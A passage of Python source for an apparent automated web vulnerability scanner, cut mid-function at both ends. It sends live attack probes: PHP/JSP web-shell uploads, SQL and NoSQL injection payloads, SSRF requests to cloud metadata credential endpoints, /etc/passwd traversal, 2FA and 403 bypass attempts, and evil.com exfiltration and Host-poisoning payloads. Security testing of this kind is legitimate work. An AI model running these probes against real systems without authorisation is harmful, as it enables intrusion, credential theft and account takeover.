        if not action: continue
        for payload in inject_payloads[:2]:
            try:
                data = {i.get("name", "field"): i.get("value", "test") for i in inputs}
                for ei in email_inputs:
                    data[ei["name"]] = payload
                r = _S.post(action, data=data, timeout=5)
                if r.status_code in (200, 302) and "error" not in r.text.lower():
                    findings.append({"type": "Email Header Injection", "severity": "medium",
                                     "url": action, "detail": f"Email form may be injectable",
                                     "template": "apex-email"})
                    break
            except: continue
    return findings


def scan_open_ports_web(subdomains):
    """Find web services on non-standard ports — often less secured."""
    findings = []
    ports = [8080, 8443, 8000, 8888, 9090, 3000, 4000, 5000, 7443, 9443, 8081, 8082, 4443, 10000]
    for sub in subdomains[:10]:
        for port in ports:
            try:
                proto = "https" if port in (8443, 7443, 9443, 4443) else "http"
                r = _S.get(f"{proto}://{sub}:{port}", timeout=3)
                if r.status_code < 400:
                    title = ""
                    try:
                        from bs4 import BeautifulSoup as BS
                        title = BS(r.text, "lxml").title.string[:50] if BS(r.text, "lxml").title else ""
                    except: pass
                    findings.append({"type": f"Web Service on Port {port}", "severity": "medium",
                                     "url": f"{proto}://{sub}:{port}",
                                     "detail": f"Service running: {title or r.status_code}",
                                     "template": "apex-ports"})
            except: continue
    return findings


# ---------------------------------------------------------------------------
# DNS zone transfer, cert transparency, API fuzzing, 2FA bypass
# ---------------------------------------------------------------------------

def scan_dns_zone_transfer(target):
    """Attempt DNS zone transfer — reveals all subdomains at once."""
    findings = []
    try:
        import subprocess
        # Get nameservers
        ns_result = subprocess.run(["dig", "+short", "NS", target], capture_output=True, text=True, timeout=10)
        nameservers = [ns.rstrip(".") for ns in ns_result.stdout.splitlines() if ns.strip()]
        for ns in nameservers[:3]:
            result = subprocess.run(["dig", "AXFR", target, f"@{ns}"], capture_output=True, text=True, timeout=10)
            if "Transfer failed" not in result.stdout and len(result.stdout) > 200:
                lines = [l for l in result.stdout.splitlines() if l and not l.startswith(";")]
                if len(lines) > 5:
                    findings.append({"type": "DNS Zone Transfer Allowed", "severity": "critical",
                                     "url": f"dns://{target}", "detail": f"NS {ns} allows AXFR — {len(lines)} records exposed",
                                     "template": "apex-dns"})
    except: pass
    return findings


def get_cert_transparency_subdomains(target):
    """Get subdomains from certificate transparency logs — finds hidden subdomains."""
    subdomains = set()
    try:
        r = requests.get(f"https://crt.sh/?q=%.{target}&output=json", timeout=15)
        for entry in r.json():
            name = entry.get("name_value", "")
            for sub in name.split("\n"):
                sub = sub.strip().lstrip("*.")
                if sub.endswith(f".{target}") or sub == target:
                    subdomains.add(sub)
    except: pass
    try:
        r = requests.get(f"https://api.certspotter.com/v1/issuances?domain={target}&include_subdomains=true&expand=dns_names", timeout=15)
        for cert in r.json():
            for name in cert.get("dns_names", []):
                name = name.lstrip("*.")
                if name.endswith(f".{target}"):
                    subdomains.add(name)
    except: pass
    return list(subdomains)


def scan_api_fuzzing(web_targets):
    """Fuzz API endpoints with common wordlist."""
    findings = []
    api_words = [
        "users", "user", "admin", "accounts", "account", "profile", "profiles",
        "config", "configuration", "settings", "debug", "test", "internal",
        "private", "secret", "token", "tokens", "keys", "key", "auth", "login",
        "logout", "register", "signup", "password", "reset", "forgot",
        "export", "import", "backup", "dump", "logs", "log", "metrics",
        "health", "status", "info", "version", "env", "environment",
        "graphql", "swagger", "api-docs", "openapi", "schema",
        "upload", "uploads", "files", "file", "download", "media",
        "payment", "payments", "billing", "invoice", "order", "orders",
        "webhook", "webhooks", "callback", "notify", "notification",
        "search", "query", "report", "reports", "analytics", "stats",
        "employee", "employees", "staff", "customer", "customers",
        "v1", "v2", "v3", "beta", "alpha", "legacy", "old", "new",
    ]
    for target in web_targets[:3]:
        for prefix in ["/api/", "/api/v1/", "/api/v2/", "/"]:
            for word in api_words:
                url = f"{target}{prefix}{word}"
                try:
                    r = _S.get(url, timeout=3, allow_redirects=False)
                    if r.status_code == 200:
                        ctype = r.headers.get("content-type", "").lower()
                        if "json" in ctype:
                            try:
                                data = r.json()
                                if isinstance(data, (list, dict)) and len(str(data)) > 30:
                                    has_sensitive = any(k in str(data).lower() for k in
                                                      ["email", "password", "token", "secret", "ssn", "credit", "phone"])
                                    sev = "critical" if has_sensitive else "medium"
                                    findings.append({"type": f"Unprotected API: {prefix}{word}", "severity": sev,
                                                     "url": url, "detail": f"Returns JSON ({len(str(data))}b)",
                                                     "template": "apex-apifuzz"})
                            except: pass
                except: continue
    return findings


def scan_2fa_bypass(crawl_data):
    """Test for 2FA/OTP bypass techniques."""
    findings = []
    for page in crawl_data.get("pages", [])[:5]:
        url = page["url"]
        if any(x in url.lower() for x in ["2fa", "otp", "verify", "mfa", "totp", "code"]):
            base = "/".join(url.split("/", 3)[:3])
            # Test null/empty OTP
            for payload in [{"code": ""}, {"code": "000000"}, {"code": "null"}, {"otp": ""}, {"token": ""}]:
                try:
                    r = _S.post(url, json=payload, timeout=5)
                    if r.status_code == 200 and "invalid" not in r.text.lower() and "error" not in r.text.lower():
                        findings.append({"type": "Possible 2FA Bypass", "severity": "critical",
                                         "url": url, "detail": f"Empty/null OTP accepted: {payload}",
                                         "template": "apex-2fa"})
                        break
                except: continue
    return findings


def scan_insecure_deserialization(crawl_data):
    """Detect potential deserialization endpoints."""
    findings = []
    deser_signatures = [
        b"\xac\xed\x00\x05",  # Java serialized object
        b"O:4:",               # PHP serialized object
        b"rO0AB",              # Java base64 serialized
    ]
    for page in crawl_data.get("pages", []):
        try:
            r = _S.get(page["url"], timeout=5)
            # Check cookies for serialized data
            for name, val in r.cookies.items():
                import base64
                try:
                    decoded = base64.b64decode(val + "==")
                    for sig in deser_signatures:
                        if decoded.startswith(sig):
                            findings.append({"type": "Serialized Object in Cookie", "severity": "high",
                                             "url": page["url"], "detail": f"Cookie {name} contains serialized data",
                                             "template": "apex-deser"})
                except: pass
            # Check response body
            for sig in deser_signatures:
                if sig in r.content:
                    findings.append({"type": "Serialized Object in Response", "severity": "high",
                                     "url": page["url"], "detail": "Response contains serialized object",
                                     "template": "apex-deser"})
        except: pass
    return findings


# ---------------------------------------------------------------------------
# Missing vulnerability scanners — completing the full list
# ---------------------------------------------------------------------------

def scan_nosql_injection(crawl_data):
    """Test for NoSQL injection (MongoDB, etc.)."""
    findings = []
    payloads = [
        {"$gt": ""},
        {"$ne": "invalid"},
        {"$where": "1==1"},
        {"$regex": ".*"},
    ]
    for form in crawl_data.get("forms", []):
        if form.get("method", "").upper() != "POST": continue
        action = form.get("action", "")
        if not action: continue
        for payload in payloads:
            try:
                data = {i.get("name","f"): payload for i in form.get("inputs",[]) if i.get("type") not in ("submit","hidden")}
                r = _S.post(action, json=data, timeout=5, headers={"Content-Type":"application/json"})
                if r.status_code == 200 and any(x in r.text.lower() for x in ["welcome","dashboard","logged","token","success"]):
                    findings.append({"type":"NoSQL Injection","severity":"critical","url":action,
                                     "detail":f"NoSQL operator {list(payload.keys())[0]} bypassed auth","template":"apex-nosql"})
                    break
            except: continue
    for url, params in crawl_data.get("params",{}).items():
        for p in params:
            try:
                parsed = urllib.parse.urlparse(url)
                qs = urllib.parse.parse_qs(parsed.query)
                qs[p] = ["[$ne]=invalid"]
                test_url = parsed._replace(query=urllib.parse.urlencode(qs,doseq=True)).geturl()
                r = _S.get(test_url, timeout=5)
                if r.status_code == 200 and len(r.content) > 100:
                    findings.append({"type":"NoSQL Injection (GET)","severity":"high","url":test_url,
                                     "detail":f"NoSQL operator in param {p}","template":"apex-nosql"})
            except: continue
    return findings


def scan_mass_assignment(crawl_data):
    """Test for mass assignment / auto-binding vulnerabilities."""
    findings = []
    extra_fields = ["role","admin","is_admin","isAdmin","superuser","privilege","level",
                    "verified","active","status","permissions","group","type","plan"]
    for form in crawl_data.get("forms",[]):
        if form.get("method","").upper() != "POST": continue
        action = form.get("action","")
        if not action: continue
        try:
            data = {i.get("name","f"): i.get("value","test") for i in form.get("inputs",[]) if i.get("name")}
            baseline = _S.post(action, data=data, timeout=5)
            for field in extra_fields:
                data[field] = "true"
                r = _S.post(action, data=data, timeout=5)
                if r.status_code == 200 and r.text != baseline.text:
                    findings.append({"type":f"Mass Assignment: {field}","severity":"high","url":action,
                                     "detail":f"Extra field {field}=true changes response","template":"apex-mass"})
                    break
                del data[field]
        except: continue
    return findings


def scan_file_upload(crawl_data):
    """Test file upload endpoints for unrestricted upload."""
    findings = []
    webshell_php = b"<?php echo shell_exec($_GET['cmd']); ?>"
    webshell_jsp = b"<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"
    for form in crawl_data.get("forms",[]):
        inputs = form.get("inputs",[])
        file_inputs = [i for i in inputs if i.get("type") == "file"]
        if not file_inputs: continue
        action = form.get("action","")
        if not action: continue
        for fname, content, ctype in [
            ("shell.php", webshell_php, "application/x-php"),
            ("shell.php.jpg", webshell_php, "image/jpeg"),
            ("shell.phtml", webshell_php, "text/html"),
            ("shell.php%00.jpg", webshell_php, "image/jpeg"),
        ]:
            try:
                files = {file_inputs[0].get("name","file"): (fname, content, ctype)}
                r = _S.post(action, files=files, timeout=5)
                if r.status_code in (200,201):
                    # Check if file was uploaded and accessible
                    urls_in_resp = re.findall(r'https?://[^\s\'"<>]+' + fname.split(".")[0], r.text)
                    if urls_in_resp or fname.split(".")[0] in r.text:
                        findings.append({"type":"Unrestricted File Upload","severity":"critical","url":action,
                                         "detail":f"Uploaded {fname} accepted","template":"apex-upload"})
                        break
            except: continue
    return findings


def scan_csrf(crawl_data):
    """Check for missing CSRF protection on state-changing forms."""
    findings = []
    for form in crawl_data.get("forms",[]):
        if form.get("method","").upper() != "POST": continue
        inputs = form.get("inputs",[])
        has_csrf = any(i.get("name","").lower() in ("csrf","_token","csrftoken","csrf_token",
                       "authenticity_token","__requestverificationtoken","_csrf") for i in inputs)
        action = form.get("action","")
        if not has_csrf and action:
            findings.append({"type":"Missing CSRF Token","severity":"medium","url":action,
                             "detail":"POST form has no CSRF token","template":"apex-csrf"})
    return findings


def scan_clickjacking(crawl_data):
    """Check for clickjacking vulnerability (missing X-Frame-Options / CSP frame-ancestors)."""
    findings = []
    tested = set()
    for page in crawl_data.get("pages",[])[:5]:
        base = "/".join(page["url"].split("/",3)[:3])
        if base in tested: continue
        tested.add(base)
        try:
            r = _S.get(page["url"], timeout=5)
            xfo = r.headers.get("X-Frame-Options","")
            csp = r.headers.get("Content-Security-Policy","")
            if not xfo and "frame-ancestors" not in csp:
                findings.append({"type":"Clickjacking (Missing X-Frame-Options)","severity":"medium",
                                 "url":page["url"],"detail":"No X-Frame-Options or CSP frame-ancestors",
                                 "template":"apex-clickjack"})
        except: pass
    return findings


def scan_cookie_security(crawl_data):
    """Check for insecure cookie flags."""
    findings = []
    tested = set()
    for page in crawl_data.get("pages",[])[:5]:
        base = "/".join(page["url"].split("/",3)[:3])
        if base in tested: continue
        tested.add(base)
        try:
            r = _S.get(page["url"], timeout=5)
            for name, cookie in r.cookies.items():
                issues = []
                raw = r.headers.get("Set-Cookie","")
                if name.lower() in ("session","sessionid","auth","token","jwt","sid","phpsessid","jsessionid"):
                    if "httponly" not in raw.lower(): issues.append("Missing HttpOnly")
                    if "secure" not in raw.lower() and page["url"].startswith("https"): issues.append("Missing Secure")
                    if "samesite" not in raw.lower(): issues.append("Missing SameSite")
                    if issues:
                        findings.append({"type":f"Insecure Cookie: {name}","severity":"medium",
                                         "url":page["url"],"detail":", ".join(issues),"template":"apex-cookie"})
        except: pass
    return findings


def scan_account_enumeration(crawl_data):
    """Test for account/user enumeration via login/reset forms."""
    findings = []
    for page in crawl_data.get("pages",[]):
        url = page["url"]
        if not any(x in url.lower() for x in ["login","signin","forgot","reset","register"]): continue
        base = "/".join(url.split("/",3)[:3])
        for path in ["/login","/api/login","/forgot-password","/api/forgot-password","/reset"]:
            try:
                r_exist = _S.post(f"{base}{path}", json={"email":"admin@admin.com","password":"wrong"}, timeout=5)
                r_noexist = _S.post(f"{base}{path}", json={"email":"nonexistent_xyz_12345@test.com","password":"wrong"}, timeout=5)
                if r_exist.status_code == r_noexist.status_code:
                    if abs(len(r_exist.text) - len(r_noexist.text)) > 20:
                        findings.append({"type":"User Enumeration","severity":"medium","url":f"{base}{path}",
                                         "detail":"Different response length for valid vs invalid user",
                                         "template":"apex-enum"})
                elif r_exist.status_code != r_noexist.status_code:
                    findings.append({"type":"User Enumeration (Status Code)","severity":"medium","url":f"{base}{path}",
                                     "detail":f"Valid user: {r_exist.status_code}, Invalid: {r_noexist.status_code}",
                                     "template":"apex-enum"})
            except: continue
    return findings


def scan_password_reset_poisoning(crawl_data):
    """Test for password reset link poisoning via Host header."""
    findings = []
    tested = set()
    for page in crawl_data.get("pages",[]):
        if not any(x in page["url"].lower() for x in ["forgot","reset","password"]): continue
        base = "/".join(page["url"].split("/",3)[:3])
        if base in tested: continue
        tested.add(base)
        for path in ["/forgot-password","/api/forgot-password","/password/reset","/auth/forgot"]:
            try:
                r = _S.post(f"{base}{path}",
                           json={"email":"test@test.com"},
                           headers={"Host":"evil.com","X-Forwarded-Host":"evil.com"},
                           timeout=5)
                if r.status_code in (200,202):
                    findings.append({"type":"Password Reset Poisoning","severity":"high","url":f"{base}{path}",
                                     "detail":"Reset endpoint accepts poisoned Host header",
                                     "template":"apex-pwreset"})
            except: continue
    return findings


def scan_http_verb_tampering(web_targets):
    """Test for HTTP verb tampering — bypass auth with unusual methods."""
    findings = []
    for target in web_targets[:3]:
        for path in ["/admin","/api/admin","/internal","/api/users"]:
            url = f"{target}{path}"
            try:
                get_r = _S.get(url, timeout=5)
                if get_r.status_code == 403:
                    for method in ["HEAD","OPTIONS","TRACE","PUT","PATCH","DELETE","CONNECT","ARBITRARY"]:
                        try:
                            r = _S.request(method, url, timeout=5)
                            if r.status_code == 200:
                                findings.append({"type":f"HTTP Verb Tampering: {method}","severity":"high",
                                                 "url":url,"detail":f"{method} bypasses 403 on {path}",
                                                 "template":"apex-verb"})
                                break
                        except: continue
            except: continue
    return findings


def scan_log_injection(crawl_data):
    """Test for log injection via user-controlled input."""
    findings = []
    payload = "test\n[CRITICAL] Admin login from 1.2.3.4 - password: admin123"
    for url, params in crawl_data.get("params",{}).items():
        for p in params:
            if any(x in p.lower() for x in ["user","name","email","log","msg","message","comment","note"]):
                try:
                    parsed = urllib.parse.urlparse(url)
                    qs = urllib.parse.parse_qs(parsed.query)
                    qs[p] = [payload]
                    test_url = parsed._replace(query=urllib.parse.urlencode(qs,doseq=True)).geturl()
                    r = _S.get(test_url, timeout=5)
                    if r.status_code == 200:
                        findings.append({"type":"Log Injection","severity":"medium","url":test_url,
                                         "detail":f"Newline in param {p} may inject log entries",
                                         "template":"apex-log"})
                        break
                except: continue
    return findings


# ---------------------------------------------------------------------------
# Advanced: XS-Leaks, ReDoS, Source Maps, postMessage, WebRTC, SSRF chains
# ---------------------------------------------------------------------------

def scan_source_map_exposure(web_targets):
    """Find exposed JavaScript source maps — reveals original source code."""
    findings = []
    for target in web_targets[:5]:
        try:
            r = _S.get(target, timeout=5)
            soup = BeautifulSoup(r.text, "lxml")
            for script in soup.find_all("script", src=True):
                src = script["src"]
                if not src.startswith("http"):
                    base = "/".join(target.split("/", 3)[:3])
                    src = base + src if src.startswith("/") else base + "/" + src
                map_url = src + ".map"
                try:
                    rm = _S.get(map_url, timeout=5)
                    if rm.status_code == 200 and "sources" in rm.text and "mappings" in rm.text:
                        findings.append({"type": "Source Map Exposed", "severity": "medium",
                                         "url": map_url, "detail": "JS source map reveals original source code",
                                         "template": "apex-sourcemap"})
                except: pass
        except: pass
    return findings


def scan_redos(crawl_data):
    """Test for ReDoS (Regular Expression Denial of Service)."""
    findings = []
    # Payloads that trigger catastrophic backtracking
    redos_payloads = [
        "a" * 50 + "!",
        "(" * 20 + "a" * 20 + ")" * 20,
        "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!",
        "1" * 100 + "@" + "1" * 100 + ".com",
    ]
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            if any(x in p.lower() for x in ["email", "phone", "zip", "postal", "regex", "pattern", "search", "query"]):
                for payload in redos_payloads[:2]:
                    try:
                        parsed = urllib.parse.urlparse(url)
                        qs = urllib.parse.parse_qs(parsed.query)
                        qs[p] = [payload]
                        test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                        start = time.time()
                        r = _S.get(test_url, timeout=10)
                        elapsed = time.time() - start
                        if elapsed > 3:
                            findings.append({"type": "ReDoS (Regex DoS)", "severity": "medium",
                                             "url": test_url, "detail": f"Response took {elapsed:.1f}s with ReDoS payload in {p}",
                                             "template": "apex-redos"})
                            break
                    except: continue
    return findings


def scan_hsts(crawl_data):
    """Check for HSTS misconfiguration."""
    findings = []
    tested = set()
    for page in crawl_data.get("pages", [])[:5]:
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested or not base.startswith("https"): continue
        tested.add(base)
        try:
            r = _S.get(page["url"], timeout=5)
            hsts = r.headers.get("Strict-Transport-Security", "")
            if not hsts:
                findings.append({"type": "Missing HSTS", "severity": "medium", "url": page["url"],
                                 "detail": "No Strict-Transport-Security header on HTTPS site",
                                 "template": "apex-hsts"})
            elif "max-age=0" in hsts:
                findings.append({"type": "HSTS Disabled (max-age=0)", "severity": "medium",
                                 "url": page["url"], "detail": "HSTS explicitly disabled", "template": "apex-hsts"})
            elif "includeSubDomains" not in hsts:
                findings.append({"type": "HSTS Missing includeSubDomains", "severity": "low",
                                 "url": page["url"], "detail": "HSTS doesn't cover subdomains", "template": "apex-hsts"})
        except: pass
    return findings


def scan_dangling_markup(crawl_data):
    """Test for dangling markup injection — exfiltrate data via HTML injection."""
    findings = []
    payload = '<img src="https://evil.com/?data='
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            try:
                parsed = urllib.parse.urlparse(url)
                qs = urllib.parse.parse_qs(parsed.query)
                qs[p] = [payload]
                test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                r = _S.get(test_url, timeout=5)
                if payload.split('"')[0] in r.text and "<script" not in r.text.lower():
                    findings.append({"type": "Dangling Markup Injection", "severity": "medium",
                                     "url": test_url, "detail": f"HTML injected without script execution via {p}",
                                     "template": "apex-dangling"})
                    break
            except: continue
    return findings


def scan_css_injection(crawl_data):
    """Test for CSS injection — can exfiltrate data via attribute selectors."""
    findings = []
    payload = "}</style><style>*{color:red}"
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            if any(x in p.lower() for x in ["style", "css", "theme", "color", "class", "skin"]):
                try:
                    parsed = urllib.parse.urlparse(url)
                    qs = urllib.parse.parse_qs(parsed.query)
                    qs[p] = [payload]
                    test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                    r = _S.get(test_url, timeout=5)
                    if "color:red" in r.text and payload[:5] in r.text:
                        findings.append({"type": "CSS Injection", "severity": "medium",
                                         "url": test_url, "detail": f"CSS injected via param {p}",
                                         "template": "apex-css"})
                        break
                except: continue
    return findings


def scan_postmessage_abuse(crawl_data):
    """Find postMessage handlers without origin validation."""
    findings = []
    for page in crawl_data.get("pages", [])[:10]:
        try:
            r = _S.get(page["url"], timeout=5)
            js = r.text
            # Find postMessage listeners without origin check
            listeners = re.findall(r'addEventListener\s*\(\s*["\']message["\']', js)
            if listeners:
                # Check if origin is validated
                has_origin_check = bool(re.search(r'event\.origin|message\.origin|e\.origin', js))
                if not has_origin_check:
                    findings.append({"type": "postMessage Without Origin Check", "severity": "medium",
                                     "url": page["url"], "detail": f"{len(listeners)} message listener(s) without origin validation",
                                     "template": "apex-postmsg"})
        except: pass
    return findings


def scan_mime_sniffing(crawl_data):
    """Check for MIME sniffing vulnerability (missing X-Content-Type-Options)."""
    findings = []
    tested = set()
    for page in crawl_data.get("pages", [])[:5]:
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested: continue
        tested.add(base)
        try:
            r = _S.get(page["url"], timeout=5)
            if not r.headers.get("X-Content-Type-Options"):
                findings.append({"type": "Missing X-Content-Type-Options", "severity": "low",
                                 "url": page["url"], "detail": "MIME sniffing not prevented",
                                 "template": "apex-mime"})
        except: pass
    return findings


def scan_null_byte(crawl_data):
    """Test for null byte injection in file-related parameters."""
    findings = []
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            if any(x in p.lower() for x in ["file", "path", "dir", "name", "page", "template", "include", "load"]):
                try:
                    parsed = urllib.parse.urlparse(url)
                    qs = urllib.parse.parse_qs(parsed.query)
                    qs[p] = ["../../../etc/passwd%00.jpg"]
                    test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                    r = _S.get(test_url, timeout=5)
                    if "root:" in r.text or "daemon:" in r.text:
                        findings.append({"type": "Null Byte Injection + LFI", "severity": "critical",
                                         "url": test_url, "detail": f"Null byte bypass in param {p}",
                                         "template": "apex-nullbyte"})
                except: continue
    return findings


def scan_ssrf_via_upload(crawl_data):
    """Test SSRF via file upload URL fields and image processing."""
    findings = []
    ssrf_urls = ["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:22",
                 "http://localhost/admin", "http://[::1]/"]
    for form in crawl_data.get("forms", []):
        inputs = form.get("inputs", [])
        url_inputs = [i for i in inputs if any(x in i.get("name", "").lower()
                      for x in ["url", "link", "src", "source", "image", "avatar", "photo", "fetch", "import"])]
        if not url_inputs: continue
        action = form.get("action", "")
        if not action: continue
        for ssrf_url in ssrf_urls[:2]:
            try:
                data = {i.get("name", "f"): i.get("value", "test") for i in inputs}
                for ui in url_inputs:
                    data[ui["name"]] = ssrf_url
                r = _S.post(action, data=data, timeout=5)
                if any(x in r.text for x in ["ami-id", "instance-id", "ssh-", "root:", "OpenSSH"]):
                    findings.append({"type": "SSRF via URL Input", "severity": "critical",
                                     "url": action, "detail": f"SSRF via {url_inputs[0]['name']} field",
                                     "template": "apex-ssrf-upload"})
                    break
            except: continue
    return findings


# ---------------------------------------------------------------------------
# Automatable: IP spoofing headers, hop-by-hop, robots/sitemap, staging,
# cloud metadata variants, signed URLs, IP bypass, X-Forwarded-For abuse
# ---------------------------------------------------------------------------

def scan_ip_header_spoofing(web_targets):
    """Test if IP-based access controls can be bypassed via headers."""
    findings = []
    spoof_headers = [
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Forwarded-For": "::1"},
        {"X-Real-IP": "127.0.0.1"},
        {"X-Client-IP": "127.0.0.1"},
        {"True-Client-IP": "127.0.0.1"},
        {"Client-IP": "127.0.0.1"},
        {"X-Originating-IP": "127.0.0.1"},
        {"Forwarded": "for=127.0.0.1"},
        {"X-Forwarded-For": "10.0.0.1"},
        {"X-Forwarded-For": "192.168.1.1"},
    ]
    for target in web_targets[:3]:
        for path in ["/admin", "/internal", "/api/admin", "/management", "/debug"]:
            url = f"{target}{path}"
            try:
                baseline = _S.get(url, timeout=5)
                if baseline.status_code != 403: continue
                for headers in spoof_headers:
                    r = _S.get(url, timeout=5, headers=headers)
                    if r.status_code == 200:
                        findings.append({"type": f"IP Spoofing Bypass: {list(headers.keys())[0]}",
                                         "severity": "critical", "url": url,
                                         "detail": f"{list(headers.keys())[0]}: 127.0.0.1 bypasses 403",
                                         "template": "apex-ipspoof"})
                        break
            except: continue
    return findings


def scan_hop_by_hop(web_targets):
    """Test hop-by-hop header abuse to strip security headers."""
    findings = []
    for target in web_targets[:3]:
        try:
            # Request that proxy strips Authorization header
            r = _S.get(target, timeout=5, headers={
                "Connection": "close, X-Custom-Header",
                "X-Custom-Header": "test",
                "Transfer-Encoding": "chunked",
            })
            # Check if security headers were stripped
            if not r.headers.get("X-Frame-Options") and not r.headers.get("Content-Security-Policy"):
                findings.append({"type": "Hop-by-Hop Header Abuse", "severity": "low",
                                 "url": target, "detail": "Security headers may be stripped by proxy",
                                 "template": "apex-hopbyhop"})
        except: pass
    return findings


def scan_robots_sitemap(target):
    """Extract sensitive paths from robots.txt and sitemap.xml."""
    findings = []
    base = f"https://{target}"
    for url in [f"{base}/robots.txt", f"http://{target}/robots.txt"]:
        try:
            r = _S.get(url, timeout=5)
            if r.status_code == 200 and ("Disallow" in r.text or "Allow" in r.text):
                disallowed = re.findall(r"Disallow:\s*(/[^\s]+)", r.text)
                sensitive = [p for p in disallowed if any(x in p.lower() for x in
                             ["admin", "api", "internal", "private", "secret", "backup",
                              "config", "debug", "test", "staging", "dev", "login"])]
                if sensitive:
                    findings.append({"type": "Robots.txt Sensitive Paths", "severity": "low",
                                     "url": url, "detail": f"Sensitive disallowed paths: {', '.join(sensitive[:5])}",
                                     "template": "apex-robots"})
                # Test if disallowed paths are actually accessible
                for path in disallowed[:10]:
                    try:
                        rp = _S.get(f"{base}{path}", timeout=3)
                        if rp.status_code == 200 and len(rp.content) > 100:
                            findings.append({"type": f"Robots.txt Path Accessible: {path}",
                                             "severity": "medium", "url": f"{base}{path}",
                                             "detail": "Disallowed path is publicly accessible",
                                             "template": "apex-robots"})
                    except: pass
        except: pass
    # Sitemap
    for url in [f"{base}/sitemap.xml", f"{base}/sitemap_index.xml"]:
        try:
            r = _S.get(url, timeout=5)
            if r.status_code == 200 and "<url>" in r.text:
                urls = re.findall(r"<loc>([^<]+)</loc>", r.text)
                sensitive = [u for u in urls if any(x in u.lower() for x in
                             ["admin", "internal", "api", "private", "debug", "test"])]
                if sensitive:
                    findings.append({"type": "Sitemap Sensitive URLs", "severity": "low",
                                     "url": url, "detail": f"{len(sensitive)} sensitive URLs in sitemap",
                                     "template": "apex-sitemap"})
        except: pass
    return findings


def scan_staging_exposure(target, subdomains):
    """Find exposed staging/dev/test environments."""
    findings = []
    prefixes = ["staging", "stage", "dev", "development", "test", "testing", "qa", "uat",
                "preprod", "pre-prod", "sandbox", "demo", "beta", "alpha", "preview",
                "internal", "corp", "admin", "api-dev", "api-staging", "api-test"]
    domain_parts = target.split(".")
    tld = ".".join(domain_parts[-2:]) if len(domain_parts) >= 2 else target

    for prefix in prefixes:
        for candidate in [f"{prefix}.{tld}", f"{prefix}-{tld}", f"{tld}-{prefix}"]:
            if candidate in subdomains: continue
            for proto in ["https", "http"]:
                try:
                    r = _S.get(f"{proto}://{candidate}", timeout=3)
                    if r.status_code < 400:
                        findings.append({"type": f"Staging/Dev Environment: {candidate}",
                                         "severity": "medium", "url": f"{proto}://{candidate}",
                                         "detail": f"Staging environment accessible ({r.status_code})",
                                         "template": "apex-staging"})
                        break
                except: continue
    return findings


def scan_cloud_metadata_variants(web_targets):
    """Test SSRF to various cloud metadata endpoints."""
    findings = []
    metadata_urls = [
        "http://169.254.169.254/latest/meta-data/",           # AWS
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",  # GCP
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure
        "http://100.100.100.200/latest/meta-data/",            # Alibaba
        "http://169.254.169.254/openstack/latest/meta_data.json",  # OpenStack
        "http://192.0.0.192/latest/meta-data/",               # Oracle
    ]
    for target in web_targets[:3]:
        for path in ["/api/fetch", "/api/proxy", "/api/request", "/fetch", "/proxy",
                     "/api/v1/fetch", "/api/url", "/api/download"]:
            url = f"{target}{path}"
            for meta_url in metadata_urls[:3]:
                try:
                    for method in ["GET", "POST"]:
                        if method == "GET":
                            r = _S.get(f"{url}?url={urllib.parse.quote(meta_url)}", timeout=5)
                        else:
                            r = _S.post(url, json={"url": meta_url}, timeout=5)
                        if any(x in r.text for x in ["ami-id", "instance-id", "iam", "computeMetadata",
                                                       "subscriptionId", "access_key", "token"]):
                            findings.append({"type": "SSRF to Cloud Metadata", "severity": "critical",
                                             "url": url, "detail": f"SSRF reaches {meta_url.split('/')[2]}",
                                             "template": "apex-cloudssrf"})
                            break
                except: continue
    return findings


def scan_origin_reflection(web_targets):
    """Test for origin reflection in CORS — reflects any origin."""
    findings = []
    for target in web_targets[:5]:
        for origin in ["https://evil.com", "null", f"https://{target.split('//')[-1]}.evil.com"]:
            try:
                r = _S.get(target, timeout=5, headers={"Origin": origin})
                acao = r.headers.get("Access-Control-Allow-Origin", "")
                acac = r.headers.get("Access-Control-Allow-Credentials", "")
                if acao == origin:
                    sev = "critical" if acac.lower() == "true" else "high"
                    findings.append({"type": "CORS Origin Reflection", "severity": sev,
                                     "url": target, "detail": f"Reflects origin {origin}, credentials={acac}",
                                     "template": "apex-cors-reflect"})
                    break
            except: pass
    return findings


# ---------------------------------------------------------------------------
# ZAP parity: CVE-specific, time-based SQLi, SSI, RFI, ShellShock, Log4Shell
# ---------------------------------------------------------------------------

def scan_time_based_sqli(crawl_data):
    """Time-based SQL injection for MySQL, MSSQL, PostgreSQL, Oracle."""
    findings = []
    # DB-specific sleep payloads
    payloads = [
        ("MySQL",      "' AND SLEEP(4)-- -",                4),
        ("MySQL",      "1 AND SLEEP(4)-- -",                4),
        ("MSSQL",      "'; WAITFOR DELAY '0:0:4'-- -",      4),
        ("MSSQL",      "1; WAITFOR DELAY '0:0:4'-- -",      4),
        ("PostgreSQL",  "'; SELECT pg_sleep(4)-- -",         4),
        ("PostgreSQL",  "1; SELECT pg_sleep(4)-- -",         4),
        ("Oracle",     "' OR 1=1 AND 1=(SELECT 1 FROM DUAL WHERE DBMS_PIPE.RECEIVE_MESSAGE('a',4)=1)-- -", 4),
        ("SQLite",     "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))-- -", 3),
    ]
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            for db, payload, sleep_time in payloads:
                try:
                    parsed = urllib.parse.urlparse(url)
                    qs = urllib.parse.parse_qs(parsed.query)
                    qs[p] = [payload]
                    test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                    start = time.time()
                    r = _S.get(test_url, timeout=sleep_time + 5)
                    elapsed = time.time() - start
                    if elapsed >= sleep_time:
